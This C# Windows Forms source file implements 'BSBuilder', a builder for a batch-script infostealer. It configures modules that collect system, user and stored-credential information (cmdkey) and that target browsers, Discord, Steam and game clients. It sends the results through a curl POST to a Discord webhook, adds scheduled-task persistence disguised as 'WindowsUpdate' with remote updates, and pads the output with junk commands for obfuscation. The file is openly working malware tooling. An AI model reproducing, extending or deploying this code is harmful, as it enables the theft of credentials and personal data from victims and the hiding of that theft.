using System;
using System.Windows.Forms;
using System.Net;
using System.Text.RegularExpressions;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Drawing;

namespace BSBuilder
{
    public partial class Form1 : Form
    {
        //ABLE TO MOVE FORM
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        string batchfetchURL = Properties.Settings.Default.fetchurl;
        string batchlocation = Properties.Settings.Default.batchlocation;
        string batch = string.Empty;

        bool forcerestart = false;
        bool acceptTOS = Properties.Settings.Default.acceptTOS;
        bool startadmin = Properties.Settings.Default.startadmin;
        bool systeminfo = Properties.Settings.Default.systeminfo;
        bool tasklist = Properties.Settings.Default.tasklist;
        bool netuser = Properties.Settings.Default.netuser;
        bool quser = Properties.Settings.Default.quser;
        bool cmdkey = Properties.Settings.Default.cmdkey;
        bool ipconfig = Properties.Settings.Default.ipconfig;
        bool chrome = Properties.Settings.Default.chrome;
        bool opera = Properties.Settings.Default.opera;
        bool vivaldi = Properties.Settings.Default.vivaldi;
        bool firefox = Properties.Settings.Default.firefox;
        bool osu = Properties.Settings.Default.osu;
        bool discord = Properties.Settings.Default.discord;
        bool steam = Properties.Settings.Default.steam;
        bool minecraft = Properties.Settings.Default.minecraft;
        bool growtopia = Properties.Settings.Default.growtopia;
        bool recurring = Properties.Settings.Default.recurring;
        bool selfdelete = Properties.Settings.Default.selfdelete;
        bool optimize = Properties.Settings.Default.optimize;
        bool obfuscate = Properties.Settings.Default.obfuscate;
        bool confuse = Properties.Settings.Default.confuse;

        string webhook = Properties.Settings.Default.webhook;
        string reportstartmsg = Properties.Settings.Default.reportstartmsg;
        string reportendmsg = Properties.Settings.Default.reportendmsg;
        string hidepath = Properties.Settings.Default.hidepath;
        string whenscheduled = Properties.Settings.Default.whenscheduled;
        string schedulename = Properties.Settings.Default.schedulename;
        string batchcopyname = Properties.Settings.Default.batchcopyname;
        string batchupdatername = Properties.Settings.Default.batchupdatername;
        string vbname = Properties.Settings.Default.vbname;
        string updateurl = Properties.Settings.Default.updateurl;
        string targetusername = Properties.Settings.Default.targetusername;

        string curlmessage0 = "curl --silent --output /dev/null -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
        string curlmessage1 = "\\\"}\"";

        public Form1()
        {
            InitializeComponent();

            this.Size = new Size(500, 679);

            acceptTOScheckbox.Checked = Properties.Settings.Default.acceptTOS;
            startadmincheckbox.Checked = Properties.Settings.Default.startadmin;
            systeminfocheckbox.Checked = Properties.Settings.Default.systeminfo;
            tasklistcheckbox.Checked = Properties.Settings.Default.tasklist;
            netusercheckbox.Checked = Properties.Settings.Default.netuser;
            qusercheckbox.Checked = Properties.Settings.Default.quser;
            cmdkeycheckbox.Checked = Properties.Settings.Default.cmdkey;
            ipconfigcheckbox.Checked = Properties.Settings.Default.ipconfig;
            chromecheckbox.Checked = Properties.Settings.Default.chrome;
            operacheckbox.Checked = Properties.Settings.Default.opera;
            vivaldicheckbox.Checked = Properties.Settings.Default.vivaldi;
            firefoxcheckbox.Checked = Properties.Settings.Default.firefox;
            osucheckbox.Checked = Properties.Settings.Default.osu;
            discordcheckbox.Checked = Properties.Settings.Default.discord;
            steamcheckbox.Checked = Properties.Settings.Default.steam;
            minecraftcheckbox.Checked = Properties.Settings.Default.minecraft;
            growtopiacheckbox.Checked = Properties.Settings.Default.growtopia;
            recurringcheckbox.Checked = Properties.Settings.Default.recurring;
            selfdeletecheckbox.Checked = Properties.Settings.Default.selfdelete;
            optimizecheckbox.Checked = Properties.Settings.Default.optimize;
            obfuscatecheckbox.Checked = Properties.Settings.Default.obfuscate;
            confusecheckbox.Checked = Properties.Settings.Default.confuse;

            webhooktextbox.Text = Properties.Settings.Default.webhook;
            reportstartmsgtextbox.Text = Properties.Settings.Default.reportstartmsg;
            reportendmsgtextbox.Text = Properties.Settings.Default.reportendmsg;
            hidepathtextbox.Text = Properties.Settings.Default.hidepath;
            whenscheduledtextbox.Text = Properties.Settings.Default.whenscheduled;
            schedulenametextbox.Text = Properties.Settings.Default.schedulename;
            batchcopynametextbox.Text = Properties.Settings.Default.batchcopyname;
            batchupdaternametextbox.Text = Properties.Settings.Default.batchupdatername;
            vbnametextbox.Text = Properties.Settings.Default.vbname;
            updateurltextbox.Text = Properties.Settings.Default.updateurl;
            targetusernametextbox.Text = Properties.Settings.Default.targetusername;

            fetchurl.Text = Properties.Settings.Default.fetchurl;
            batchlocationtextbox.Text = Properties.Settings.Default.batchlocation;

            fetchbatch();
        }

        void fetchbatch()
        {
            var client = new WebClient();
            client.DownloadStringCompleted += (sender, e) =>
            {
                try
                {
                    batch = e.Result;
                    richtextbox.Text = batch;
                    fetchstatus.Text = "Batch file fetched from the URL";
                }
                catch
                {
                    if (batchlocation.Length != 0)
                    {
                        batch = File.ReadAllText(Path.GetFullPath(batchlocation));
                        richtextbox.Text = batch;
                        fetchstatus.Text = "Batch file loaded from local drive";
                    }
                    else
                    {
                        MessageBox.Show("Failed to load batch from " + batchfetchURL + " and no local file has been set.", "Critical error");
                    }
                }
            };

            Uri BatchURL = new Uri(batchfetchURL);
            try { client.DownloadStringAsync(BatchURL); }
            catch { MessageBox.Show("Failed to load batch from " + batchfetchURL, "Critical error"); }
        }

        private void searchbatchbutton_Click(object sender, EventArgs e)
        {
            OpenFileDialog file = new OpenFileDialog();
            file.InitialDirectory = AppDomain.CurrentDomain.BaseDirectory;
            file.Title = "Select the bat you want to build (Needs to be BatchStealer)";
            file.Filter = "Batch script (*.bat*)|*.bat*";
            file.RestoreDirectory = true;
            if (file.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    batch = File.ReadAllText(Path.GetFullPath(file.FileName));
                    richtextbox.Text = batch;

                    batchlocation = Path.GetFullPath(file.FileName);
                    batchlocationtextbox.Text = batchlocation;

                    if (batch.Length != 0) { fetchstatus.Text = "Batch file loaded from local drive"; }
                }
                catch
                {
                    MessageBox.Show("Failed to load the batch file.", "Fail");
                }
            }
        }

        private void searchhidepathbutton_Click(object sender, EventArgs e)
        {
            using (var file = new FolderBrowserDialog())
            {
                DialogResult result = file.ShowDialog();

                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(file.SelectedPath))
                {
                    if (file.SelectedPath.Contains(" "))
                    {
                        MessageBox.Show("Path(s) with spaces on them might break the batch script,\ntask scheduler might not be able to execute your file.\n\nYour path will still be set, but recurring will most likely NOT work.", "Hold on");
                        hidepathtextbox.Text = file.SelectedPath;
                    }
                    else
                    {
                        hidepathtextbox.Text = file.SelectedPath;
                    }

                }
            }
        }

        void removeGOTO(string data)
        {
            batch = batch.Replace(data, string.Empty);

            data = data.Substring(5);
            data = ":" + data.PadLeft(data.Length, '0');

            batch = batch.Replace(data, string.Empty);
        }

        void removeFUNCTION(string data)
        {
            string first = data;
            data = data.Substring(5);
            data = ":" + data.PadLeft(data.Length, '0');
            string last = data;

            batch = Regex.Replace(batch, first + "\n((.+\n)+)" + last, string.Empty);
        }

        void editVAR(string original, string variable, string data)
        {
            batch = batch.Replace(original, "set \"" + variable + "=" + data + "\"");
        }

        void editCURL(string original, string data)
        {
            string newcurl = curlmessage0 + data + curlmessage1;
            batch = batch.Replace(original, newcurl);
        }

        void obfuscatebatch(string batchsource, int pass)
        {
            //Todo
        }

        private void buildbutton_Click(object sender, EventArgs e)
        {
            if (forcerestart)
            {
                Application.Restart();
                Environment.Exit(0);
            }
            else
            {
                if (batch.Length != 0)
                {
                    if (acceptTOS)
                        removeGOTO("goto remove_this_if_you_agree_to_follow_the_TOS");
                    else if (optimize)
                        removeFUNCTION("goto remove_this_if_you_agree_to_follow_the_TOS");

                    if (startadmin)
                        removeGOTO("goto skipadministrator");
                    else if (optimize)
                        removeFUNCTION("goto skipadministrator");

                    if (systeminfo)
                        removeGOTO("goto skipsysteminfocapture");
                    else if (optimize)
                        removeFUNCTION("goto skipsysteminfocapture");

                    if (tasklist)
                        removeGOTO("goto skiptasklist");
                    else if (optimize)
                        removeFUNCTION("goto skiptasklist");

                    if (netuser)
                        removeGOTO("goto skipnetuser");
                    else if (optimize)
                        removeFUNCTION("goto skipnetuser");

                    if (quser)
                        removeGOTO("goto skipquser");
                    else if (optimize)
                        removeFUNCTION("goto skipquser");

                    if (cmdkey)
                        removeGOTO("goto skipcmdkey");
                    else if (optimize)
                        removeFUNCTION("goto skipcmdkey");

                    if (ipconfig)
                        removeGOTO("goto skipipconfig");
                    else if (optimize)
                        removeFUNCTION("goto skipipconfig");

                    if (chrome)
                        removeGOTO("goto skipchrome");
                    else if (optimize)
                        removeFUNCTION("goto skipchrome");

                    if (opera)
                        removeGOTO("goto skipopera");
                    else if (optimize)
                        removeFUNCTION("goto skipopera");

                    if (vivaldi)
                        removeGOTO("goto skipvivaldi");
                    else if (optimize)
                        removeFUNCTION("goto skipvivaldi");

                    if (firefox)
                        removeGOTO("goto skipfirefox");
                    else if (optimize)
                        removeFUNCTION("goto skipfirefox");

                    if (osu)
                        removeGOTO("goto skiposu");
                    else if (optimize)
                        removeFUNCTION("goto skiposu");

                    if (discord)
                        removeGOTO("goto skipdiscord");
                    else if (optimize)
                        removeFUNCTION("goto skipdiscord");

                    if (steam)
                        removeGOTO("goto skipsteam");
                    else if (optimize)
                        removeFUNCTION("goto skipsteam");

                    if (minecraft)
                        removeGOTO("goto skipminecraft");
                    else if (optimize)
                        removeFUNCTION("goto skipminecraft");

                    if (growtopia)
                        removeGOTO("goto skipgrowtopia");
                    else if (optimize)
                        removeFUNCTION("goto skipgrowtopia");

                    if (selfdelete)
                        removeGOTO("goto skipselfdelete");
                    else if (optimize)
                        removeFUNCTION("goto skipselfdelete");

                    if (reportstartmsg.Length != 0)
                        editCURL(curlmessage0 + "```[Report from %USERNAME% - %NetworkIP%]\\nLocal time: %HH24%:%MI%```" + curlmessage1, reportstartmsg);
                    if (reportendmsg.Length != 0)
                        editCURL(curlmessage0 + "```Batch Scheduled: %recurring%\\n[End of report]```" + curlmessage1, reportendmsg);

                    if (webhook.Length != 0)
                        editVAR("set \"webhook=https://discord.com/api/webhooks/\"", "webhook", webhook);

                    if (obfuscate)
                        obfuscatebatch(batch, 1);

                    if (optimize)
                    {
                        batch = Regex.Replace(batch, @"^::.*", string.Empty, RegexOptions.Multiline);
                        batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
                    }

                    if (recurring)
                    {
                        removeGOTO("goto skiprecurring");

                        if (hidepath.Length != 0)
                            editVAR("set \"vpath=C:\\ProgramData\"", "vpath", hidepath);
                        if (whenscheduled.Length != 0)
                            editVAR("set \"when=Daily\"", "when", whenscheduled);
                        if (schedulename.Length != 0)
                            editVAR("set \"ScheduleName=WindowsUpdate\"", "ScheduleName", schedulename);
                        if (batchcopyname.Length != 0)
                            editVAR("set \"bname=0.bat\"", "bname", batchcopyname);
                        if (batchupdatername.Length != 0)
                            editVAR("set \"uname=1.bat\"", "uname", batchupdatername);
                        if (vbname.Length != 0)
                            editVAR("set \"vname=0.vbs\"", "vname", vbname);
                        if (updateurl.Length != 0)
                            editVAR("set \"updateurl=\"", "updateurl", updateurl);
                        if (targetusername.Length != 0)
                            editVAR("set \"targetusername=\"", "targetusername", targetusername);
                    }
                    else if (optimize)
                        removeFUNCTION("goto skiprecurring");

                    if (confuse)
                    {
                        Random rand = new Random();

                        //Amount of lines
                        int phase01random = rand.Next(100, 15000);
                        int phase03random = rand.Next(100, 3500);

                        //Variable for soon to be confused batch
                        string confusedbatch = "";

                        //Random bullshit commands that serve no actual purpose
                        string[] commands = {
                            "IF %F%==1 IF %C%==1",
                            "   ELSE IF %F%==1 IF %C%==0",
                            "ELSE IF %F%==0 IF %C%==1",
                            " ELSE IF %F%==0 IF %C%==1",
                            "goto endoftests",
                            "   goto workdone",
                            "set F=%date%",
                            ":: Fixed",
                            "if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.)",
                            "   if %user_agrees% do",
                            "set /p folder=fd:" +
                            "FOR /R %folder% %%G IN (.) DO (" +
                            "   set filepath=%%~dpa" +
                            "\n)" +
                            "%time% & dir & echo %time%",
                            "\npause" +
                            "\n)",
                            "   set filepath=%%~fG",
                            "set filepath=%%~fG & set /p folder=f: & set F=%date% & for /f \"delims=[] tokens=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| findstr [') do set d=%%a",
                            "   set for /f \"delims=[] tokens=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| findstr [') do set d=%%a & set F=%date%",
                            "ELSE IF %F%==0 IF %C%==1 & set C=cls & set /A spl =1",
                            "   timeout /t 2 /nobreak > NUL & if errorlevel 0 (set r=true, %when%) else (set r=failed, %when%, correct.) & IF %F%==1 do %C%==1",
                            "timeout /t 2 /nobreak > NUL & if errorlevel 1(set r = true, % then %) else (set r = success, % then %, false.) &IF % F %== 2 do % C %== 4",
                            "   set C=cls",
                            "   set /A sample =1",
                            "   fc /l %comp1% %comp2%",
                            "for /f \"delims=[] tokens=2\" %%a in ('2^>NUL b -4 -n 1 %cmptr% ^| findstr [') do set d=%%a",
                            "   timeout /t 2 /nobreak > NUL",
                            "   if errorlevel 1 (@echo off) else",
                            "whoami",
                            "   if %ERRORLEVEL% EQU 1 goto w",
                            "move \"%sourceFile%\" \"%destinationFile%\"",
                            "   move \"%sourceFile%\" \"%destinationFile%\"",
                            "cls",
                            "",
                            "",
                            "",
                            "",
                            "",
                            "",
                            "",
                            "",
                            "",
                            "",
                            "if 0==1 0",
                            "   if 0==1 0",
                            "cd.",
                            "call",
                            "   call",
                            "setlocal",
                            "2>NUL Info > %tempsys%",
                            "   2>NUL Info > %tempsys%"
                        };

                        //To avoid two same commands being put in a row 
                        string lastcommand = "";

                        //PHASE 01 | ADD RANDOM GARBAGE COMMANDS TO THE START
                        for (int i = 0; i <= phase01random; i++)
                        {
                            //First time
                            if (i == 1)
                            {
                                //Fake copyright notice ranging from 2004-2009 with a fake version
                                confusedbatch = ":: Copyright © 200" + rand.Next(4, 9) + " - V" + rand.Next(1, 10) + "." + rand.Next(1, 69420) + "\n@echo off\ncd.\nif 0==1 0\ngoto tmp";
                            }
                            //Generally
                            else
                            {
                                start:
                                int a = rand.Next(0, commands.Length);

                                if (commands[a] != lastcommand)
                                {
                                    confusedbatch = confusedbatch + Environment.NewLine;
                                    confusedbatch = confusedbatch + commands[a];

                                    if (i == phase01random)
                                    {
                                        //Last time
                                        confusedbatch = confusedbatch + Environment.NewLine;
                                        confusedbatch = confusedbatch + ":tmp";
                                    }
                                }
                                else goto start;

                                lastcommand = commands[a];
                            }
                        }

                        //PHASE 02 | ADD BATCH CONTENT TO THE MIDDLE
                        confusedbatch = confusedbatch + "\n" + batch;

                        //PHASE 03 | ADD RANDOM GARBAGE TO THE END
                        for (int i = 0; i <= phase03random; i++)
                        {
                            //First time
                            if (i == 1)
                            {
                                confusedbatch = confusedbatch + Environment.NewLine;
                                confusedbatch = confusedbatch + "goto temp";
                            }
                            //Generally
                            else
                            {
                                start:
                                int a = rand.Next(0, commands.Length);

                                if (commands[a] != lastcommand)
                                {
                                    confusedbatch = confusedbatch + Environment.NewLine;
                                    confusedbatch = confusedbatch + commands[a];

                                    if (i == phase03random)
                                    {
                                        //Last time
                                        confusedbatch = confusedbatch + Environment.NewLine;
                                        confusedbatch = confusedbatch + ":temp\nexit";
                                    }
                                }
                                else goto start;

                                lastcommand = commands[a];
                            }
                        }

                        //Finished
                        batch = confusedbatch;
                    }

                    //Write batch
                    using (StreamWriter wt = new StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "output.bat"))
                    {
                        wt.WriteLine(batch);
                    }

                    //Open finished batch folder
                    Process.Start(AppDomain.CurrentDomain.BaseDirectory);

                    //Basically useless stuff as program will get restarted anyways
                    richtextbox.Text = batch;
                    Builderbox.Enabled = false;
                    acceptTOScheckbox.Enabled = false;
                    forcerestart = true;
                    buildbutton.Text = "Restart the program";
                    //--------------------------------------------------------------

                    //Restart application for reasons
                    Application.Restart();
                }
                else
                {
                    //Something fucked up with building
                    MessageBox.Show("Could not build, missing batch script.", "Critical Error");
                }
            }
        }

        private void webhooktextbox_TextChanged(object sender, EventArgs e)
        {
            webhook = webhooktextbox.Text;
        }

        private void reportstartmsgtextbox_TextChanged(object sender, EventArgs e)
        {
            reportstartmsg = reportstartmsgtextbox.Text;
        }

        private void reportendmsgtextbox_TextChanged(object sender, EventArgs e)
        {
            reportendmsg = reportendmsgtextbox.Text;
        }

        private void hidepathtextbox_TextChanged(object sender, EventArgs e)
        {
            hidepath = hidepathtextbox.Text;
        }

        private void schedulenametextbox_TextChanged(object sender, EventArgs e)
        {
            schedulename = schedulenametextbox.Text;
        }

        private void batchcopynametextbox_TextChanged(object sender, EventArgs e)
        {
            batchcopyname = batchcopynametextbox.Text;
        }

        private void batchupdaternametextbox_TextChanged(object sender, EventArgs e)
        {
            batchupdatername = batchupdaternametextbox.Text;
        }

        private void vbnametextbox_TextChanged(object sender, EventArgs e)
        {
            vbname = vbnametextbox.Text;
        }

        private void updateurltextbox_TextChanged(object sender, EventArgs e)
        {
            updateurl = updateurltextbox.Text;
        }

        private void targetusernametextbox_TextChanged(object sender, EventArgs e)
        {
            targetusername = targetusernametextbox.Text;
        }

        private void fetchurl_TextChanged(object sender, EventArgs e)
        {
            batchfetchURL = fetchurl.Text;
        }

        private void whenscheduledtextbox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (whenscheduledtextbox.Text == "Onlogon")
            {
                if (startadmin)
                    whenscheduled = whenscheduledtextbox.Text;
                else
                {
                    MessageBox.Show("Please enable 'Start as Administrator' before changing this to '" + whenscheduledtextbox.Text + "'. Otherwise the batch file won't be scheduled.\n\nYour batch file will not ask for administrator when started by the scheduler. It will stay hidden.", "Incorrect settings");
                    whenscheduledtextbox.Text = "Daily";
                }

            }
            else
                whenscheduled = whenscheduledtextbox.Text;
        }

        private void acceptTOScheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (acceptTOScheckbox.Checked)
            {
                acceptTOS = true;
                allpanel.Enabled = true;
            }
            else
            {
                acceptTOS = false;
                allpanel.Enabled = false;
            }
        }

        private void startadmincheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (startadmincheckbox.Checked)
            {
                startadmin = true;
            }
            else
            {
                startadmin = false;
            }
        }

        private void selfdeletecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (selfdeletecheckbox.Checked)
            {
                selfdelete = true;
            }
            else
            {
                selfdelete = false;
            }
        }

        private void systeminfocheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (systeminfocheckbox.Checked)
            {
                systeminfo = true;
            }
            else
            {
                systeminfo = false;
            }
        }

        private void tasklistcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (tasklistcheckbox.Checked)
            {
                tasklist = true;
            }
            else
            {
                tasklist = false;
            }
        }

        private void netusercheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (netusercheckbox.Checked)
            {
                netuser = true;
            }
            else
            {
                netuser = false;
            }
        }

        private void qusercheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (qusercheckbox.Checked)
            {
                quser = true;
            }
            else
            {
                quser = false;
            }
        }

        private void cmdkeycheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (cmdkeycheckbox.Checked)
            {
                cmdkey = true;
            }
            else
            {
                cmdkey = false;
            }
        }

        private void chromecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (chromecheckbox.Checked)
            {
                chrome = true;
            }
            else
            {
                chrome = false;
            }
        }

        private void operacheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (operacheckbox.Checked)
            {
                opera = true;
            }
            else
            {
                opera = false;
            }
        }

        private void vivaldicheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (vivaldicheckbox.Checked)
            {
                vivaldi = true;
            }
            else
            {
                vivaldi = false;
            }
        }

        private void firefoxcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (firefoxcheckbox.Checked)
            {
                firefox = true;
            }
            else
            {
                firefox = false;
            }
        }

        private void osucheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (osucheckbox.Checked)
            {
                osu = true;
            }
            else
            {
                osu = false;
            }
        }

        private void discordcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (discordcheckbox.Checked)
            {
                discord = true;
            }
            else
            {
                discord = false;
            }
        }

        private void steamcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (steamcheckbox.Checked)
            {
                steam = true;
            }
            else
            {
                steam = false;
            }
        }

        private void minecraftcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (minecraftcheckbox.Checked)
            {
                minecraft = true;
            }
            else
            {
                minecraft = false;
            }
        }

        private void growtopiacheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (growtopiacheckbox.Checked)
            {
                growtopia = true;
            }
            else
            {
                growtopia = false;
            }
        }

        private void recurringcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (recurringcheckbox.Checked)
            {
                recurring = true;
                recurringpanel.Enabled = true;
            }
            else
            {
                recurring = false;
                recurringpanel.Enabled = false;
            }
        }

        private void optimizecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (optimizecheckbox.Checked)
            {
                optimize = true;
            }
            else
            {
                optimize = false;
            }
        }

        private void obfuscatecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (obfuscatecheckbox.Checked)
            {
                obfuscate = true;
            }
            else
            {
                obfuscate = false;
            }
        }

        private void ipconfigcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (ipconfigcheckbox.Checked)
            {
                ipconfig = true;
            }
            else
            {
                ipconfig = false;
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.fetchurl = batchfetchURL;

            Properties.Settings.Default.acceptTOS = acceptTOS;
            Properties.Settings.Default.startadmin = startadmin;
            Properties.Settings.Default.systeminfo = systeminfo;
            Properties.Settings.Default.tasklist = tasklist;
            Properties.Settings.Default.netuser = netuser;
            Properties.Settings.Default.quser = quser;
            Properties.Settings.Default.cmdkey = cmdkey;
            Properties.Settings.Default.ipconfig = ipconfig;
            Properties.Settings.Default.chrome = chrome;
            Properties.Settings.Default.opera = opera;
            Properties.Settings.Default.vivaldi = vivaldi;
            Properties.Settings.Default.firefox = firefox;
            Properties.Settings.Default.osu = osu;
            Properties.Settings.Default.discord = discord;
            Properties.Settings.Default.steam = steam;
            Properties.Settings.Default.minecraft = minecraft;
            Properties.Settings.Default.growtopia = growtopia;
            Properties.Settings.Default.recurring = recurring;
            Properties.Settings.Default.selfdelete = selfdelete;
            Properties.Settings.Default.optimize = optimize;
            Properties.Settings.Default.obfuscate = obfuscate;
            Properties.Settings.Default.confuse = confuse;

            Properties.Settings.Default.webhook = webhook;
            Properties.Settings.Default.reportstartmsg = reportstartmsg;
            Properties.Settings.Default.reportendmsg = reportendmsg;
            Properties.Settings.Default.hidepath = hidepath;
            Properties.Settings.Default.whenscheduled = whenscheduled;
            Properties.Settings.Default.schedulename = schedulename;
            Properties.Settings.Default.batchcopyname = batchcopyname;
            Properties.Settings.Default.batchupdatername = batchupdatername;
            Properties.Settings.Default.vbname = vbname;
            Properties.Settings.Default.updateurl = updateurl;
            Properties.Settings.Default.targetusername = targetusername;
            Properties.Settings.Default.batchlocation = batchlocation;

            Properties.Settings.Default.Save();
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void label13_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        bool iii = false;
        private void inspectorbutton_Click(object sender, EventArgs e)
        {
            if (iii)
            {
                iii = false;
                this.Size = new Size(500, 679);
                inspectorbutton.Text = ">";

            }
            else
            {
                iii = true;
                this.Size = new Size(1232, 679);
                inspectorbutton.Text = "<";
            }
        }

        private void exitbutton_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void fetchbutton_Click(object sender, EventArgs e)
        {
            fetchbatch();
        }

        private void confusecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (confusecheckbox.Checked)
            {
                confuse = true;
            }
            else
            {
                confuse = false;
            }
        }
    }
}
